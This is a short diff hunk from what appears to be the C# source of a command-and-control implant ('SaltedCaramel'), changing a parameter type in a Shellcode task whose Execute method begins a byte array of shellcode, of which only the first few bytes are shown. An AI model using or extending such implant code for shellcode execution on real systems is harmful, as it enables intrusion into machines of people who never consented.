@@ -5,7 +5,7 @@ namespace SaltedCaramel.Tasks
 {
     public class Shellcode
     {
-        public static void Execute(SCTaskObject task, SCImplant implant)
+        public static void Execute(SCTask task, SCImplant implant)
         {
             byte[] shellcode = new byte[] {
                 0x50,0x53,0x51,0x52,0x56,0x57,0x55,0x89,
